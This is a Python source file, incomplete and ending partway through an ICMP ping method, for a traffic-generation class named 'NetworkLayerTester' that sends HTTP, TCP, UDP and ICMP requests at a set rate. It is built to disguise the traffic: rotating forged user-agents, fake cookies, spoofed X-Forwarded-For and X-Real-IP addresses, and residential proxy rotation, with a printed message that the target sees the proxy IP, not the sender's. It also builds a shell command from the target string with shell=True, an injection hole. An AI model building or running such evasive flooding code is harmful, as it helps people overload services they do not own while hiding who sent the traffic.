import requests
import threading
import time
import asyncio
import aiohttp
import socket
import struct
import random
import subprocess
import platform
from concurrent.futures import ThreadPoolExecutor
import signal
import sys
import urllib3
import json
from urllib.parse import urlparse, urlencode
import os

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class NetworkLayerTester:
    def __init__(self, target, target_type="http", requests_per_second=10, duration=10, use_proxy=False, proxy_config=None):
        self.target = target
        self.target_type = target_type
        self.requests_per_second = requests_per_second
        self.duration = duration
        self.use_proxy = use_proxy
        self.proxy_config = proxy_config
        self.results = []
        self.lock = threading.Lock()
        self.running = True
        self.start_time = None
        self.request_count = 0
        self.last_user_agent = None  # Track last used UA to avoid repetition
        
        # Request compatibility tracking
        self.compatible_methods = set()
        self.compatible_content_types = set()
        self.supports_cookies = False
        self.supports_compression = False
        self.supports_keep_alive = False
        self.supports_ssl = False
        self.server_info = {}
        
        # Enhanced browser configurations
        self.browser_configs = {
            'chrome': {
                'versions': ['120.0.0.0', '119.0.0.0', '118.0.0.0', '117.0.0.0', '116.0.0.0', '115.0.0.0', '114.0.0.0', '113.0.0.0'],
                'platforms': [
                    'Windows NT 10.0', 'Windows NT 11.0', 'Windows NT 6.3', 'Windows NT 6.2', 'Windows NT 6.1',
                    'Macintosh; Intel Mac OS X 10_15_7', 'Macintosh; Intel Mac OS X 10_15_6', 'Macintosh; Intel Mac OS X 10_14_6',
                    'X11; Linux x86_64', 'X11; Linux aarch64', 'X11; CrOS x86_64'
                ],
                'mobile': [
                    'Linux; Android 14', 'Linux; Android 13', 'Linux; Android 12', 'Linux; Android 11',
                    'iPhone; CPU iPhone OS 17_2_1', 'iPhone; CPU iPhone OS 16_6_1'
                ],
                'devices': [
                    # Samsung devices
                    'SM-S918B', 'SM-S908B', 'SM-S901B',  # S23, S22, S21
                    'SM-A546B', 'SM-A536B', 'SM-A526B',  # A54, A53, A52
                    'SM-F946B', 'SM-F936B', 'SM-F926B',  # Fold 5, 4, 3
                    'SM-Z Flip5', 'SM-F731B', 'SM-F711B',  # Flip series
                    # Google devices
                    'Pixel 8 Pro', 'Pixel 8', 'Pixel 7 Pro', 'Pixel 7', 'Pixel 6 Pro', 'Pixel 6',
                    # OnePlus devices
                    'OnePlus 11', 'OnePlus 10 Pro', 'OnePlus 9 Pro', 'OnePlus Nord 3', 'OnePlus Nord 2',
                    # Xiaomi devices
                    'Mi 13 Pro', 'Mi 12', 'Mi 11', 'Redmi Note 12 Pro', 'POCO F5',
                    # OPPO devices
                    'Find X6 Pro', 'Find X5 Pro', 'Reno 10 Pro', 'Reno 9 Pro',
                    # Motorola devices
                    'Edge 40 Pro', 'Edge 30 Pro', 'Moto G Power', 'Moto G Stylus',
                    # Tablets
                    'SM-X916B', 'SM-X810', 'Pixel Tablet', 'Mi Pad 6'
                ]
            },
            'firefox': {
                'versions': ['121.0', '120.0', '119.0', '118.0', '117.0', '116.0', '115.0', '114.0'],
                'platforms': [
                    'Windows NT 10.0; Win64; x64', 'Windows NT 11.0; Win64; x64',
                    'Windows NT 6.3; Win64; x64', 'Windows NT 6.2; Win64; x64',
                    'Macintosh; Intel Mac OS X 10.15', 'Macintosh; Intel Mac OS X 10.14',
                    'Macintosh; ARM Mac OS X 11_0', 'Macintosh; ARM Mac OS X 12_0',
                    'X11; Linux x86_64', 'X11; Linux i686', 'X11; Ubuntu; Linux x86_64',
                    'X11; Fedora; Linux x86_64', 'X11; Arch; Linux x86_64'
                ],
                'mobile': [
                    'Android 14', 'Android 13', 'Android 12',
                    'Mobile; rv:121.0', 'Mobile; rv:120.0', 'Tablet; rv:121.0'
                ]
            },
            'safari': {
                'versions': ['17.2.1', '17.2', '17.1', '17.0', '16.6', '16.5', '16.4', '16.3'],
                'platforms': [
                    'Macintosh; Intel Mac OS X 10_15_7', 'Macintosh; Intel Mac OS X 10_15_6',
                    'Macintosh; ARM Mac OS X 11_0', 'Macintosh; ARM Mac OS X 12_0',
                    'iPhone; CPU iPhone OS 17_2_1', 'iPhone; CPU iPhone OS 17_1_2',
                    'iPhone; CPU iPhone OS 16_6_1', 'iPhone; CPU iPhone OS 16_5_1',
                    'iPad; CPU OS 17_2_1', 'iPad; CPU OS 17_1_2',
                    'iPad; CPU OS 16_6_1', 'iPad; CPU OS 16_5_1'
                ],
                'devices': [
                    'iPhone15,4', 'iPhone15,3', 'iPhone15,2', 'iPhone14,8',  # iPhone 15 series
                    'iPhone14,7', 'iPhone14,6', 'iPhone14,5',  # iPhone 14 series
                    'iPhone13,4', 'iPhone13,3', 'iPhone13,2',  # iPhone 13 series
                    'iPad14,6', 'iPad14,5', 'iPad14,4', 'iPad14,3-A',  # iPad Pro series
                    'iPad13,19', 'iPad13,18', 'iPad13,17'  # iPad Air series
                ]
            },
            'edge': {
                'versions': [
                    '120.0.2210.133', '119.0.2151.97', '118.0.2088.76',
                    '117.0.2045.47', '116.0.1938.81', '115.0.1901.203'
                ],
                'platforms': [
                    'Windows NT 10.0; Win64; x64', 'Windows NT 11.0; Win64; x64',
                    'Windows NT 6.3; Win64; x64', 'Windows NT 6.2; Win64; x64',
                    'Macintosh; Intel Mac OS X 10_15_7', 'Macintosh; ARM Mac OS X 11_0',
                    'X11; Linux x86_64'
                ]
            },
            'opera': {
                'versions': ['106.0.0.0', '105.0.0.0', '104.0.0.0', '103.0.0.0'],
                'platforms': [
                    'Windows NT 10.0; Win64; x64', 'Windows NT 11.0; Win64; x64',
                    'Macintosh; Intel Mac OS X 10_15_7',
                    'X11; Linux x86_64',
                    'Linux; Android 14', 'Linux; Android 13'
                ]
            }
        }
        
        # Request variations for more impact
        self.request_methods = ['GET', 'POST', 'HEAD', 'OPTIONS']
        self.post_data_types = [
            'application/x-www-form-urlencoded',
            'application/json',
            'multipart/form-data',
            'text/plain'
        ]
        
        # Header configurations
        self.accept_headers = [
            'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'application/json,text/plain,*/*',
            'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5',
            'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
        ]
        
        self.accept_languages = [
            'en-US,en;q=0.9',
            'en-GB,en;q=0.8,en-US;q=0.6',
            'en-CA,en;q=0.9,fr-CA;q=0.8',
            'en-AU,en;q=0.9,es;q=0.8',
            'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
            'de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7',
            'ja-JP,ja;q=0.9,en-US;q=0.8,en;q=0.7',
            'es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7',
            'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
            'it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7'
        ]
        
        self.accept_encodings = [
            'gzip, deflate, br',
            'gzip, deflate',
            'br;q=1.0, gzip;q=0.8, *;q=0.1',
            'gzip;q=1.0, identity; q=0.5, *;q=0'
        ]
        
        # Cache control variations
        self.cache_controls = [
            'no-cache',
            'no-store, no-cache, must-revalidate',
            'max-age=0, no-cache, no-store',
            'max-age=0, private, must-revalidate',
            None  # Sometimes send no cache header
        ]
        
        # Header templates
        self.header_templates = {
            'content_headers': {
                'application/json': {
                    'Accept': 'application/json',
                    'Content-Type': 'application/json'
                },
                'application/x-www-form-urlencoded': {
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Content-Type': 'application/x-www-form-urlencoded'
                },
                'multipart/form-data': {
                    'Accept': '*/*',
                    'Content-Type': 'multipart/form-data'
                },
                'text/html': {
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Content-Type': 'text/html'
                }
            },
            'browser_specific': {
                'Chrome': {
                    'Sec-Ch-Ua': '" Not A;Brand";v="99", "Chromium";v="{chrome_ver}", "Google Chrome";v="{chrome_ver}"',
                    'Sec-Ch-Ua-Mobile': '?0',
                    'Sec-Ch-Ua-Platform': '"Windows"',
                    'Sec-Fetch-Dest': 'document',
                    'Sec-Fetch-Mode': 'navigate',
                    'Sec-Fetch-Site': 'none',
                    'Sec-Fetch-User': '?1'
                },
                'Firefox': {
                    'DNT': '1',
                    'Upgrade-Insecure-Requests': '1',
                    'Sec-Fetch-Dest': 'document',
                    'Sec-Fetch-Mode': 'navigate',
                    'Sec-Fetch-Site': 'none',
                    'Sec-Fetch-User': '?1'
                },
                'Safari': {
                    'X-Apple-Device': None,
                    'X-Apple-OS-Version': None,
                    'Accept-Language': 'en-US,en;q=0.9'
                }
            },
            'security_headers': {
                'X-Requested-With': 'XMLHttpRequest',
                'DNT': '1',
                'X-Forwarded-For': '{random_ip}',
                'X-Real-IP': '{random_ip}',
                'Origin': None,
                'Referer': None
            },
            'mobile_headers': {
                'X-Requested-With': 'com.android.chrome',
                'Sec-Ch-Ua-Mobile': '?1',
                'Sec-Ch-Ua-Platform': ['Android', 'iOS'],
                'X-Mobile-Type': ['Android', 'iPhone']
            },
            'extra_headers': {
                'Accept-Language': [
                    'en-US,en;q=0.9',
                    'en-GB,en;q=0.8,en-US;q=0.6',
                    'fr-FR,fr;q=0.9,en-US;q=0.8',
                    'de-DE,de;q=0.9,en-US;q=0.8'
                ],
                'Accept-Encoding': [
                    'gzip, deflate, br',
                    'gzip, deflate',
                    'br;q=1.0, gzip;q=0.8, *;q=0.1'
                ],
                'Cache-Control': [
                    'no-cache',
                    'max-age=0',
                    'no-store, no-cache, must-revalidate'
                ],
                'Pragma': 'no-cache',
                'X-Client-Data': [
                    'CIe2yQEIpbbJAQipncoBCNPiygE=',
                    'CJe2yQEIo7bJAQjBncoBCKPiygE='
                ]
            }
        }

        # Cookie templates
        self.cookie_templates = {
            'session': {
                'session_id': '{random_hex_16}',
                'user_id': '{random_num}',
                'timestamp': '{timestamp}',
                'last_visit': '{date_time}'
            },
            'tracking': {
                'visitor_id': '{random_num}',
                'first_visit': '{timestamp}',
                'visits': '{1-100}',
                'source': 'direct'
            },
            'preferences': {
                'theme': 'light',
                'lang': 'en',
                'timezone': 'UTC',
                'currency': 'USD'
            }
        }

        # Post data templates
        self.post_data_templates = {
            'application/x-www-form-urlencoded': [
                {'username': 'user_{id}', 'password': 'pass_{id}'},
                {'email': 'user_{id}@example.com', 'name': 'User {id}'},
                {'action': 'login', 'token': '{timestamp}'},
                {'type': 'search', 'query': 'item_{id}'},
                {'page': '{id}', 'limit': '10', 'sort': 'desc'}
            ],
            'application/json': [
                {'user': {'id': '{id}', 'action': 'verify'}},
                {'data': {'type': 'request', 'timestamp': '{timestamp}'}},
                {'query': {'search': 'item_{id}', 'filter': 'active'}},
                {'params': {'session': '{id}', 'token': '{timestamp}'}},
                {'config': {'lang': 'en', 'version': '{id}'}}
            ],
            'text/plain': [
                'request_id={id}&timestamp={timestamp}',
                'action=verify&token={id}',
                'session={timestamp}&user={id}',
                'type=ping&data={id}',
                'query=search_{id}'
            ]
        }
        
        # User-Agent configuration
        self.user_agents = [
            # Windows Browsers
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.2210.133 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/119.0.2151.97 Safari/537.36',
            # macOS Browsers
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15',
            # Linux Browsers
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0',
            # Mobile Browsers
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (iPad; CPU OS 17_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 14; SM-A546B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36'
        ]
        
        # Parse target based on type
        self.target_host = None
        self.target_port = None
        self.parse_target()
        
        # Setup proxy configuration
        self.proxies = None
        if self.use_proxy and self.proxy_config:
            self.setup_proxy()
        
        # Enhanced monitoring attributes
        self.monitoring_stats = {
            'start_time': None,
            'last_request_time': None,
            'request_intervals': [],
            'response_times': [],
            'status_codes': {},
            'errors': {},
            'bytes_sent': 0,
            'bytes_received': 0,
            'successful_requests': 0,
            'failed_requests': 0,
            'current_rps': 0,
            'peak_rps': 0,
            'min_response_time': float('inf'),
            'max_response_time': 0,
            'total_requests': 0
        }
        
        # Real-time monitoring intervals
        self.monitor_interval = 1  # Update stats every second
        self.last_monitor_update = time.time()
        self.interval_requests = 0
    
        # Request pattern templates
        self.request_patterns = {
            'search': {
                'path': ['/search', '/find', '/query', '/lookup'],
                'params': {
                    'q': ['product', 'item', 'search'],
                    'page': ['1', '2', '3'],
                    'limit': ['10', '20', '50', '100'],
                    'sort': ['relevance', 'date', 'price'],
                    'order': ['asc', 'desc'],
                    'category': ['electronics', 'clothing', 'books', 'toys'],
                    'filter': ['new', 'used', 'all'],
                    '_': ['{timestamp}']
                }
            },
            'product': {
                'path': ['/product', '/item', '/p', '/i'],
                'params': {
                    'id': ['{1000-9999}'],
                    'variant': ['1', '2', '3'],
                    'color': ['red', 'blue', 'green', 'black'],
                    'size': ['S', 'M', 'L', 'XL'],
                    'currency': ['USD', 'EUR', 'GBP'],
                    '_': ['{timestamp}']
                }
            },
            'cart': {
                'path': ['/cart', '/basket', '/bag', '/checkout'],
                'params': {
                    'action': ['add', 'remove', 'update', 'clear'],
                    'product_id': ['{1000-9999}'],
                    'quantity': ['1', '2', '3', '4', '5'],
                    'session': ['{session_id}'],
                    '_': ['{timestamp}']
                }
            },
            'user': {
                'path': ['/user', '/account', '/profile', '/me'],
                'params': {
                    'view': ['orders', 'wishlist', 'settings'],
                    'tab': ['personal', 'security', 'preferences'],
                    'lang': ['en', 'es', 'fr', 'de'],
                    '_': ['{timestamp}']
                }
            },
            'api': {
                'path': ['/api/v1', '/api/v2', '/api/v3', '/rest'],
                'params': {
                    'method': ['get', 'list', 'search', 'update'],
                    'format': ['json', 'xml'],
                    'key': ['{api_key}'],
                    'version': ['1.0', '2.0', '3.0'],
                    '_': ['{timestamp}']
                }
            },
            'media': {
                'path': ['/media', '/images', '/files', '/downloads'],
                'params': {
                    'type': ['image', 'video', 'document'],
                    'id': ['{1000-9999}'],
                    'width': ['800', '1024', '1920'],
                    'quality': ['high', 'medium', 'low'],
                    '_': ['{timestamp}']
                }
            },
            'auth': {
                'path': ['/auth', '/login', '/signin', '/register'],
                'params': {
                    'provider': ['local', 'google', 'facebook', 'twitter'],
                    'redirect': ['/dashboard', '/home', '/account'],
                    'client_id': ['{client_id}'],
                    '_': ['{timestamp}']
                }
            },
            'blog': {
                'path': ['/blog', '/news', '/articles', '/posts'],
                'params': {
                    'category': ['tech', 'lifestyle', 'business'],
                    'tag': ['featured', 'trending', 'new'],
                    'author': ['admin', 'editor', 'user'],
                    'date': ['{date}'],
                    '_': ['{timestamp}']
                }
            }
        }

        # Dynamic path parameters
        self.path_params = {
            'id': lambda: str(random.randint(1000, 9999)),
            'session_id': lambda: ''.join(random.choices('0123456789abcdef', k=32)),
            'api_key': lambda: ''.join(random.choices('0123456789abcdef', k=32)),
            'client_id': lambda: ''.join(random.choices('0123456789ABCDEF', k=16)),
            'timestamp': lambda: str(int(time.time() * 1000)),
            'date': lambda: time.strftime('%Y-%m-%d'),
            'random_num': lambda: str(random.randint(10000, 99999))
        }
    
    def parse_target(self):
        """Parse target based on network layer type"""
        if self.target_type in ["tcp", "udp", "icmp"]:
            # Clean URL to hostname for ICMP
            if self.target_type == "icmp":
                if "://" in self.target:
                    parsed = urlparse(self.target)
                    self.target = parsed.netloc or parsed.path
                    if ":" in self.target:
                        self.target = self.target.split(":")[0]
            
            # Parse host:port for TCP/UDP
            if ":" in self.target and self.target_type in ["tcp", "udp"]:
                self.target_host, port_str = self.target.split(":", 1)
                try:
                    self.target_port = int(port_str)
                except ValueError:
                    print("❌ Invalid port number")
                    self.target_port = 80 if self.target_type == "tcp" else 53
            else:
                self.target_host = self.target
                self.target_port = 80 if self.target_type == "tcp" else 53
        elif self.target_type == "http":
            self.target_host = self.target
        else:
            self.target_host = self.target
    
    def setup_proxy(self):
        """Setup proxy configuration for HTTP requests"""
        if self.proxy_config:
            proxy_url = f"http://{self.proxy_config['username']}:{self.proxy_config['password']}@{self.proxy_config['host']}:{self.proxy_config['port']}"
            self.proxies = {
                'http': proxy_url,
                'https': proxy_url
            }
            print(f"✓ Proxy configured: {self.proxy_config['host']}:{self.proxy_config['port']}")
            
            # Test proxy connection
            self.test_proxy_connection()
    
    def browser_configs(self):
        """Browser configurations for user agent generation"""
        return {
            'chrome': {
                'versions': ['120.0.0.0', '119.0.0.0', '118.0.0.0', '117.0.0.0'],
                'platforms': [
                    'Windows NT 10.0', 'Windows NT 11.0', 'Windows NT 6.3',
                    'Macintosh; Intel Mac OS X 10_15_7',
                    'X11; Linux x86_64', 'X11; Linux aarch64'
                ],
                'mobile': [
                    'Linux; Android 14', 'Linux; Android 13',
                    'iPhone; CPU iPhone OS 17_2_1'
                ],
                'devices': [
                    'SM-S918B', 'SM-S908B',  # Samsung
                    'Pixel 8 Pro', 'Pixel 8',  # Google
                    'OnePlus 11', 'OnePlus 10 Pro',  # OnePlus
                    'iPhone15,4', 'iPhone14,8'  # iPhone
                ]
            },
            'firefox': {
                'versions': ['121.0', '120.0', '119.0', '118.0'],
                'platforms': [
                    'Windows NT 10.0; Win64; x64',
                    'Macintosh; Intel Mac OS X 10.15',
                    'X11; Linux x86_64'
                ],
                'mobile': [
                    'Android 14', 'Android 13',
                    'Mobile; rv:121.0', 'Tablet; rv:121.0'
                ]
            },
            'safari': {
                'versions': ['17.2.1', '17.2', '17.1', '17.0'],
                'platforms': [
                    'Macintosh; Intel Mac OS X 10_15_7',
                    'iPhone; CPU iPhone OS 17_2_1',
                    'iPad; CPU OS 17_2_1'
                ]
            }
        }

    def user_agents(self):
        """Pre-generated list of common user agents"""
        return [
            # Windows Chrome
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            # Windows Firefox
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
            # macOS Safari
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15',
            # Mobile Safari
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
            # Android Chrome
            'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36'
        ]

    def get_random_user_agent(self):
        """Get a random User-Agent string"""
        return random.choice(self.user_agents)

    def generate_user_agent(self):
        """Generate a realistic and rotating User-Agent"""
        browser = random.choice(list(self.browser_configs.keys()))
        config = self.browser_configs[browser]
        
        # Ensure we don't use the same UA twice in a row
        while True:
            if browser in ['chrome', 'edge', 'opera']:
                platform = random.choice(config['platforms'])
                version = random.choice(config['versions'])
                
                if 'Android' in platform or 'iPhone' in platform:
                    device = random.choice(config.get('devices', ['SM-S918B', 'Pixel 8', 'iPhone15,4']))
                    ua = f'Mozilla/5.0 ({platform}; {device}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{version} Mobile Safari/537.36'
                    if browser == 'edge':
                        ua += f' Edg/{version}'
                    elif browser == 'opera':
                        ua += f' OPR/{version}'
                else:
                    ua = f'Mozilla/5.0 ({platform}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{version} Safari/537.36'
                    if browser == 'edge':
                        ua += f' Edg/{version}'
                    elif browser == 'opera':
                        ua += f' OPR/{version}'
            
            elif browser == 'firefox':
                platform = random.choice(config['platforms'])
                version = random.choice(config['versions'])
                if any(mobile in platform for mobile in config['mobile']):
                    ua = f'Mozilla/5.0 ({platform}; {random.choice(config["mobile"])}) Gecko/20100101 Firefox/{version}'
                else:
                    ua = f'Mozilla/5.0 ({platform}; rv:{version}) Gecko/20100101 Firefox/{version}'
            
            elif browser == 'safari':
                platform = random.choice(config['platforms'])
                version = random.choice(config['versions'])
                if 'iPhone' in platform or 'iPad' in platform:
                    device = random.choice(config['devices'])
                    ua = f'Mozilla/5.0 ({platform}; {device}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{version} Mobile/15E148 Safari/604.1'
                else:
                    ua = f'Mozilla/5.0 ({platform}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{version} Safari/605.1.15'
            
            if ua != self.last_user_agent:
                self.last_user_agent = ua
                return ua
            
            # If we somehow got the same UA, try again with a different browser
            browser = random.choice(list(self.browser_configs.keys()))

    def generate_cookies(self):
        """Generate realistic cookie values with error handling"""
        try:
            cookies = {}
            timestamp = str(int(time.time()))
            date_time = time.strftime('%Y-%m-%d %H:%M:%S')
            random_hex_16 = ''.join(random.choices('0123456789abcdef', k=16))
            random_num = str(random.randint(100000000, 999999999))

            # Session cookies
            try:
                for key, value in self.cookie_templates['session'].items():
                    try:
                        cookies[key] = value.format(
                            random_hex_16=random_hex_16,
                            timestamp=timestamp,
                            date_time=date_time,
                            random_num=random_num
                        )
                    except (KeyError, ValueError, IndexError) as e:
                        print(f"Warning: Failed to format session cookie {key}: {str(e)}")
                        cookies[key] = random_hex_16  # Fallback value
            except Exception as e:
                print(f"Warning: Error generating session cookies: {str(e)}")

            # Tracking cookies (70% chance)
            if random.random() < 0.7:
                try:
                    for key, value in self.cookie_templates['tracking'].items():
                        try:
                            if isinstance(value, str) and '{' in value and '}' in value:
                                if '-' in value:  # Handle range pattern
                                    start, end = map(int, value.strip('{}').split('-'))
                                    cookies[key] = str(random.randint(start, end))
                                else:  # Handle named parameter
                                    cookies[key] = value.format(
                                        random_num=random_num,
                                        timestamp=timestamp
                                    )
                            else:
                                cookies[key] = value
                        except (KeyError, ValueError, IndexError) as e:
                            print(f"Warning: Failed to format tracking cookie {key}: {str(e)}")
                            cookies[key] = timestamp  # Fallback value
                except Exception as e:
                    print(f"Warning: Error generating tracking cookies: {str(e)}")

            # Preference cookies (50% chance)
            if random.random() < 0.5:
                try:
                    cookies.update(self.cookie_templates['preferences'])
                except Exception as e:
                    print(f"Warning: Error adding preference cookies: {str(e)}")

            return cookies

        except Exception as e:
            print(f"Warning: Cookie generation failed: {str(e)}")
            # Return minimal cookie set as fallback
            return {
                'session': ''.join(random.choices('0123456789abcdef', k=32)),
                'timestamp': str(int(time.time()))
            }

    def generate_random_headers(self):
        """Generate random but realistic headers"""
        headers = {}
        browser = random.choice(['Chrome', 'Firefox', 'Safari'])
        is_mobile = random.random() < 0.3  # 30% chance for mobile
        
        # Basic headers
        headers['User-Agent'] = self.generate_user_agent()
        
        # Content headers
        content_type = random.choice(list(self.header_templates['content_headers'].keys()))
        headers.update(self.header_templates['content_headers'][content_type])
        
        # Browser-specific headers
        if browser in self.header_templates['browser_specific']:
            browser_headers = self.header_templates['browser_specific'][browser].copy()
            if browser == 'Chrome':
                chrome_ver = random.choice(['120', '119', '118'])
                browser_headers['Sec-Ch-Ua'] = browser_headers['Sec-Ch-Ua'].format(chrome_ver=chrome_ver)
            elif browser == 'Safari':
                browser_headers['X-Apple-Device'] = random.choice(['iPhone', 'iPad', 'MacBook'])
                browser_headers['X-Apple-OS-Version'] = f"{random.randint(14,17)}.{random.randint(0,4)}"
            headers.update(browser_headers)
        
        # Security headers
        security_headers = self.header_templates['security_headers'].copy()
        for key, value in security_headers.items():
            if isinstance(value, list):
                security_headers[key] = random.choice(value)
        
        origin = f"https://{self.target_host}" if self.target_host else "null"
        referer = random.choice([
            origin,
            "https://www.google.com/",
            "https://www.bing.com/",
            "https://t.co/",
            "https://www.facebook.com/"
        ])
        security_headers['Origin'] = origin
        security_headers['Referer'] = referer
        headers.update(security_headers)
        
        # Mobile headers if mobile
        if is_mobile:
            mobile_headers = self.header_templates['mobile_headers'].copy()
            for key, value in mobile_headers.items():
                if isinstance(value, list):
                    mobile_headers[key] = random.choice(value)
            headers.update(mobile_headers)
        
        # Extra headers (randomly add some)
        extra_headers = dict(random.sample(list(self.header_templates['extra_headers'].items()),
                                    k=random.randint(2, 5)))
        for key, value in extra_headers.items():
            if value == '{random_ip}':
                headers[key] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            elif isinstance(value, list):
                headers[key] = random.choice(value)
            else:
                headers[key] = value
        
        # Add cookies
        cookies = self.generate_cookies()
        if cookies:
            headers['Cookie'] = '; '.join(f'{k}={v}' for k, v in cookies.items())
        
        return headers

    def get_request_headers(self):
        """Get enhanced request headers with full randomization"""
        return self.generate_random_headers()

    def test_proxy_connection(self):
        """Test proxy connection and show IP information"""
        try:
            print("🔍 Testing proxy connection...")
            
            headers = self.get_request_headers()
            
            # Test without proxy first
            direct_response = requests.get('https://httpbin.org/ip', 
                                         timeout=10, 
                                         verify=False,
                                         headers=headers)
            direct_ip = direct_response.json().get('origin', 'Unknown')
            print(f"📍 Your direct IP: {direct_ip}")
            
            # Test with proxy
            if self.proxies:
                proxy_response = requests.get('https://httpbin.org/ip', 
                                            proxies=self.proxies, 
                                            timeout=15, 
                                            verify=False,
                                            headers=headers)
                proxy_ip = proxy_response.json().get('origin', 'Unknown')
                print(f"🌐 Proxy IP: {proxy_ip}")
                
                if direct_ip != proxy_ip:
                    print("✅ Proxy is working! Your target will see the proxy IP, not yours.")
                    
                    # Get additional info
                    try:
                        geo_response = requests.get('https://httpbin.org/headers', 
                                                  proxies=self.proxies, 
                                                  timeout=10, 
                                                  verify=False)
                        print("✅ Proxy headers test successful")
                    except:
                        print("⚠️ Proxy working but headers test failed")
                else:
                    print("❌ Warning: Proxy may not be working - same IP detected")
            
        except Exception as e:
            print(f"⚠️ Proxy test failed: {e}")
            print("🔄 Continuing anyway - proxy may still work during actual testing")
    
    def get_session_id(self):
        """Generate random session ID for residential proxy rotation"""
        if self.use_proxy and self.proxy_config:
            session_id = ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=8))
            username = self.proxy_config['username'].replace('f4YxGjAW', session_id)
            proxy_url = f"http://{username}:{self.proxy_config['password']}@{self.proxy_config['host']}:{self.proxy_config['port']}"
            return {'http': proxy_url, 'https': proxy_url}
        return self.proxies
    
    def layer3_icmp_test(self, request_id):
        """Enhanced Layer 3 - ICMP Ping Test with advanced features"""
        try:
            start_time = time.time()
            
            # Enhanced platform detection for better command construction
            system = platform.system().lower()
            
            # Advanced ping parameters based on OS
            if system == "windows":
                # Windows ping with size and TTL options
                size_param = random.choice([32, 64, 128, 256, 512, 1024, 1472])  # Various packet sizes
                ttl = random.randint(32, 128)  # Random TTL
                cmd = f"ping -n 1 -w 3000 -l {size_param} -i {ttl} {self.target_host}"
            else:
                # Linux/Unix ping with advanced options
                size_param = random.choice([32, 64, 128, 256, 512, 1024, 1472])
                ttl = random.randint(32, 128)
                pattern = ''.join(random.choices('0123456789abcdef', k=8))  # Random pattern
                cmd = f"ping -c 1 -W 3 -s {size_param} -t {ttl} -p {pattern} {self.target_host}"
            
            # Execute with timeout
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=5)
            end_time = time.time()
            
            success = result.returncode == 0
            
            # Enhanced ping time extraction with multiple format support
